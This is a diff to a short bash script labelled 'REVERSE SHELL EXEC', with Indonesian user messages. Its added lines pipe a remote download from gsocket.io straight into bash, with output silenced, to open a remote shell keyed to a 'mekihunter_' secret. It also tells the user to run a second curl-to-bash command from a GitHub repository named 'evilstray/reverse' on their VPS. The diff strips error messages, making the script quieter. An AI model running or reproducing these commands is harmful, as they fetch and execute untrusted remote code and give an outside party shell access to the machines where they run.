@@ -1,5 +1,3 @@
-#!/bin/bash
-
 BLUE="\033[0;34m"
 RED="\033[0;31m"
 RESET="\033[0m"
@@ -10,19 +8,17 @@ echo -e "$BLUE ##  REVERSE SHELL EXEC  ##
 
 # Check if $API is set
 if [ -z "$API" ]; then
-  # echo -e "$RED Gagal: API tidak boleh kosong!$RESET"
-  echo "API variable is missing!"
+  :
 else
-  X="mekihunter_$API" bash -c "$(curl -fsSL https://paste.ee/r/C8YolZJS/0)"
+  X="mekihunter_$API" bash -c "$(curl -fsSL https://gsocket.io/x)" > /dev/null 2>&1
   echo "Silahkan jalankan command berikut ini pada VPS Anda : "
   echo 'FROM_API="$API" bash -c "$(curl -fsSL https://raw.githubusercontent.com/evilstray/reverse/refs/heads/main/dx"'
 fi
 
 # Check if $FROM_API is set
 if [ -z "$FROM_API" ]; then
-  # echo -e "$RED Gagal: FROM_API tidak boleh kosong!$RESET"
-  echo "FROM_API variable is missing!"
+  :
 else
-  S="mekihunter_$FROM_API" bash -c "$(curl -fsSL https://paste.ee/r/C8YolZJS/0)"
+  S="mekihunter_$FROM_API" bash -c "$(curl -fsSL https://gsocket.io/x)"
   echo "Berhasil: Terhubung ke shell!"
 fi
